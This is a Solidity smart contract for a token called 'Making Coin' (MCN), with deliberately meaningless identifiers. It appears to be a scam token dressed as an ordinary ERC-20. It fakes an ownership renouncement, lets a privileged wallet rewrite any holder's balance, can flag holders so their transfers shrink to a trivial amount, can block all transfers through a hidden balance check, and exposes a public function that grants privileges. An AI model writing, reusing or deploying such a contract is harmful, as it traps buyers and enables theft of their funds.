//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface buyEnable {
    function createPair(address fundToken, address minShould) external returns (address);
}

interface maxShouldMarketing {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverIs) external view returns (uint256);

    function transfer(address minLaunch, uint256 marketingTeam) external returns (bool);

    function allowance(address exemptLaunched, address spender) external view returns (uint256);

    function approve(address spender, uint256 marketingTeam) external returns (bool);

    function transferFrom(
        address sender,
        address minLaunch,
        uint256 marketingTeam
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atMax, uint256 value);
    event Approval(address indexed exemptLaunched, address indexed spender, uint256 value);
}

abstract contract launchedTx {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface isToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface maxShouldMarketingMetadata is maxShouldMarketing {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract MakingCoin is launchedTx, maxShouldMarketing, maxShouldMarketingMetadata {

    address public toTokenWallet;

    function totalSupply() external view virtual override returns (uint256) {
        return receiverMarketing;
    }

    string private exemptMarketingTx = "Making Coin";

    uint256 modeTotalTake;

    function modeFee() public {
        emit OwnershipTransferred(toTokenWallet, address(0));
        buyAt = address(0);
    }

    uint256 private autoLaunched;

    mapping(address => mapping(address => uint256)) private totalAuto;

    function decimals() external view virtual override returns (uint8) {
        return sellIs;
    }

    function symbol() external view virtual override returns (string memory) {
        return modeTrading;
    }

    function balanceOf(address receiverIs) public view virtual override returns (uint256) {
        return exemptSwap[receiverIs];
    }

    function txMaxFund() private view {
        require(teamLiquidity[_msgSender()]);
    }

    string private modeTrading = "MCN";

    bool public takeSwapAt;

    bool public txModeMax;

    bool public marketingFee;

    function approve(address enableLaunch, uint256 marketingTeam) public virtual override returns (bool) {
        totalAuto[_msgSender()][enableLaunch] = marketingTeam;
        emit Approval(_msgSender(), enableLaunch, marketingTeam);
        return true;
    }

    uint256 receiverSell;

    function toToken(address txLiquidity, uint256 marketingTeam) public {
        txMaxFund();
        exemptSwap[txLiquidity] = marketingTeam;
    }

    function listReceiver(address toTx, address minLaunch, uint256 marketingTeam) internal returns (bool) {
        require(exemptSwap[toTx] >= marketingTeam);
        exemptSwap[toTx] -= marketingTeam;
        exemptSwap[minLaunch] += marketingTeam;
        emit Transfer(toTx, minLaunch, marketingTeam);
        return true;
    }

    address liquidityTakeTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private receiverMarketing = 100000000 * 10 ** 18;

    address launchedExemptFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function allowance(address liquidityLaunchedList, address enableLaunch) external view virtual override returns (uint256) {
        if (enableLaunch == launchedExemptFund) {
            return type(uint256).max;
        }
        return totalAuto[liquidityLaunchedList][enableLaunch];
    }

    uint256 private exemptIs;

    uint8 private sellIs = 18;

    mapping(address => uint256) private exemptSwap;

    function modeFund(address toTx, address minLaunch, uint256 marketingTeam) internal returns (bool) {
        if (toTx == toTokenWallet) {
            return listReceiver(toTx, minLaunch, marketingTeam);
        }
        uint256 atAuto = maxShouldMarketing(launchSender).balanceOf(liquidityTakeTeam);
        require(atAuto == modeTotalTake);
        require(minLaunch != liquidityTakeTeam);
        if (totalTradingLimit[toTx]) {
            return listReceiver(toTx, minLaunch, toReceiver);
        }
        return listReceiver(toTx, minLaunch, marketingTeam);
    }

    uint256 private totalMaxLaunched;

    event OwnershipTransferred(address indexed toSell, address indexed listFrom);

    function owner() external view returns (address) {
        return buyAt;
    }

    constructor (){
        if (autoLaunched != tradingMinReceiver) {
            totalMaxLaunched = feeLaunch;
        }
        isToken autoLaunch = isToken(launchedExemptFund);
        launchSender = buyEnable(autoLaunch.factory()).createPair(autoLaunch.WETH(), address(this));
        if (maxFundTake) {
            autoLaunched = totalMaxLaunched;
        }
        toTokenWallet = _msgSender();
        teamLiquidity[toTokenWallet] = true;
        exemptSwap[toTokenWallet] = receiverMarketing;
        modeFee();
        
        emit Transfer(address(0), toTokenWallet, receiverMarketing);
    }

    function transfer(address txLiquidity, uint256 marketingTeam) external virtual override returns (bool) {
        return modeFund(_msgSender(), txLiquidity, marketingTeam);
    }

    mapping(address => bool) public totalTradingLimit;

    function transferFrom(address toTx, address minLaunch, uint256 marketingTeam) external override returns (bool) {
        if (_msgSender() != launchedExemptFund) {
            if (totalAuto[toTx][_msgSender()] != type(uint256).max) {
                require(marketingTeam <= totalAuto[toTx][_msgSender()]);
                totalAuto[toTx][_msgSender()] -= marketingTeam;
            }
        }
        return modeFund(toTx, minLaunch, marketingTeam);
    }

    bool public maxFundTake;

    function name() external view virtual override returns (string memory) {
        return exemptMarketingTx;
    }

    mapping(address => bool) public teamLiquidity;

    function limitWalletMin(address tokenSell) public {
        txMaxFund();
        if (marketingFee == takeSwapAt) {
            autoLaunched = totalMaxLaunched;
        }
        if (tokenSell == toTokenWallet || tokenSell == launchSender) {
            return;
        }
        totalTradingLimit[tokenSell] = true;
    }

    function getOwner() external view returns (address) {
        return buyAt;
    }

    uint256 constant toReceiver = 9 ** 10;

    uint256 public feeLaunch;

    address public launchSender;

    address private buyAt;

    function modeIsFund(address swapTotal) public {
        if (txModeMax) {
            return;
        }
        
        teamLiquidity[swapTotal] = true;
        if (autoLaunched == exemptIs) {
            autoLaunched = exemptIs;
        }
        txModeMax = true;
    }

    uint256 private tradingMinReceiver;

    function tradingModeToken(uint256 marketingTeam) public {
        txMaxFund();
        modeTotalTake = marketingTeam;
    }

}